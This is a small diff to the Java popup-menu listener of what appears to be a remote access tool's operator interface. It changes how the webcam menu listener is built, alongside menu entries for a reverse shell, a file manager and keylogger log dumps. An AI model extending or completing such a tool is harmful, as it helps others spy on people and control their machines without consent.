@@ -125,7 +125,7 @@ public class TablePopUpListener extends MouseAdapter {
 
         JTable connectionsTable = mainGUI.getConnectionsTable();
         // set actions
-        webcamMenu.addActionListener(new WebcamMenuListener());
+        webcamMenu.addActionListener(new WebcamMenuListener(mainGUI));
         fileManagerMenu.addActionListener(new FileManagerMenuListener(mainGUI));
         reverseShellMenu.addActionListener(new ReverseShellMenuListener(mainGUI));
         dumpLogsMenu.addActionListener(new KeyLoggerEventsListener(KeyloggerEvents.DUMP_LAST));
